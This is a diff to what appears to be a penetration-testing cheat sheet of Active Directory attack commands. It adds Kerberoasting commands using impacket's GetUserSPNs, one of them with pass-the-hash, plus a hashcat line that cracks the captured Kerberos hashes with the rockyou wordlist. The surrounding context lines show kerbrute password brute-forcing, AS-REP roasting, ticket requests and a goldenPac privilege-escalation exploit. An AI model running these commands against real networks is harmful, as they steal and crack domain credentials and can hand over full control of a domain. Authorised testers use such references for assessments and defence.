@@ -706,8 +706,11 @@ sudo /opt/kerbrute/kerbrute bruteuser -d {DOMAIN} --dc {IP ADDRESS} /usr/share/w
 # Get active directory users
 python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
 
-# Get user SPN
-python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
+# Kerberoast - Get user SPN
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS} -outputfile hashes.kerberoast
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -hashes {HASH}:{HASH} {DOMAIN}/{USERNAME} -dc-ip {DC IP} -outputfile hashes.kerberoast
+
+hashcat -m 13100 {HASH} /usr/share/wordlists/rockyou.txt -O --force
 
 # ASREP ROAST
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN}/ -dc-ip {IP ADDRESS} -format john
@@ -720,7 +723,6 @@ python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME}:{
 
 # Kerberos PAC enabled
 python3 /usr/share/doc/python3-impacket/examples/goldenPac.py {DOMAIN}/{USER}@{FULL DOMAIN} -dc-ip {IP ADDRESS} -target-ip {IP ADDRESS}
-
 
 # Bloodhound
 sudo neo4j console                          # LHOST
